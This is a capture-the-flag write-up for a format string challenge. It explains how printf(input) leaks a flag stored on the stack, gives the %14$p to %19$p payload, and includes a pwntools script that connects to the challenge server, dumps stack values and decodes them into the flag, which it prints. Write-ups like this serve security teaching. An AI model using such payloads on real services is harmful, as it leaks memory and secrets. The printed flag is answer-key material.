# secrets

## Overview
A format string challenge. The program reads the flag from `flag.txt` into a buffer on the stack, then reads user input and prints it using `printf(input)` without format specifiers, creating a format string vulnerability.

## Analysis
Looking at the disassembly of `main`:
1. It opens `flag.txt` and reads `0x40` bytes into `[rbp-0x50]`.
2. It reads `0x40` bytes from `stdin` into `[rbp-0x90]`.
3. It calls `printf([rbp-0x90])`.

Because the user input is directly passed as the format string to `printf`, and the flag is stored on the stack at `[rbp-0x50]`, we can leak the flag by using `%p` format specifiers to dump values from the stack.

The stack offset to `[rbp-0x50]` from the `printf` arguments begins at argument 14. We can print out `%14$p %15$p %16$p %17$p %18$p` to get the hex representation of the characters of the flag. Since it is a 64-bit program (Little Endian), the bytes are reversed in each 8-byte block.

## Solution
1. Connect to the service.
2. Send `%14$p %15$p %16$p %17$p %18$p %19$p`.
3. Parse the leaked hexadecimal values, decode them from hex, reverse the bytes, and concatenate them to get the flag.

```python
from pwn import *
context.arch = 'amd64'

r = remote('136.115.87.65', 31779)
payload = b"%14$p %15$p %16$p %17$p %18$p %19$p"
r.sendline(payload)
res = r.recvall(timeout=2).decode()
parts = res.split()[0:6]

flag = ""
for p in parts:
    if p.startswith("0x"):
        try:
            # Little endian decode
            flag += bytes.fromhex(p[2:])[::-1].decode('utf-8')
        except:
            pass
print("FLAG:", flag)
```

**Flag:** `LITCTF{PRINTF-vULN3r4b1LitY-ZftvINYopu}`
